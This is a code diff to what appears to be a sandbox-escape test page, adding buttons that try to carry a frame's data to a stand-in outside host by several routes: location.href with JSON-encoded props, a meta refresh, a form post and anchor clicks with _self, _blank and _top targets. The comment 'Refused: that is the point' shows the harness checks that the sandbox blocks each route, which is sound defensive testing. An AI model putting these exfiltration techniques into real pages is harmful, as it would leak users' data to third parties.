@@ -70,6 +70,41 @@ async function attack(origin: string) {
   frame.requestSize(9_000_000);
   report.done = true;
   render();
+  render();
+}
+
+/**
+ * Carrying what it was given to another site by sending the frame there: by address, by meta
+ * refresh, by a form and by a link. Each is a button, because one that works replaces the frame.
+ */
+const OUT = "http://outside.example/leak?d=";
+const leaks: Record<string, () => void> = {
+  href: () => {
+    location.href = `${OUT}${encodeURIComponent(JSON.stringify(frame.props()?.data ?? {}))}`;
+  },
+  meta: () => {
+    const meta = document.createElement("meta");
+    meta.httpEquiv = "refresh";
+    meta.content = `0;url=${OUT}meta`;
+    document.head.append(meta);
+  },
+  form: () => {
+    const form = document.createElement("form");
+    form.action = `${OUT}form`;
+    form.method = "post";
+    document.body.append(form);
+    form.submit();
+  },
+  anchorSelf: () => link("_self"),
+  anchorBlank: () => link("_blank"),
+  anchorTop: () => link("_top"),
+};
+function link(target: string) {
+  const anchor = document.createElement("a");
+  anchor.href = `${OUT}anchor`;
+  anchor.target = target;
+  document.body.append(anchor);
+  anchor.click();
 }
 
 function render() {
@@ -90,7 +125,21 @@ function render() {
   const scheme = document.createElement("p");
   scheme.id = "scheme";
   scheme.textContent = `${props?.theme.scheme} ${document.documentElement.dataset.theme ?? ""} ${getComputedStyle(document.documentElement).getPropertyValue("--volvel-canvas")}`;
-  root.append(shown, say, scheme, out);
+  const leakers = Object.entries(leaks).map(([name, leak]) => {
+    const button = document.createElement("button");
+    button.type = "button";
+    button.id = `leak-${name}`;
+    button.textContent = `Leak ${name}`;
+    button.onclick = () => {
+      try {
+        leak();
+      } catch {
+        // Refused: that is the point.
+      }
+    };
+    return button;
+  });
+  root.append(shown, say, scheme, out, ...leakers);
 }
 
 frame.onProps(() => {
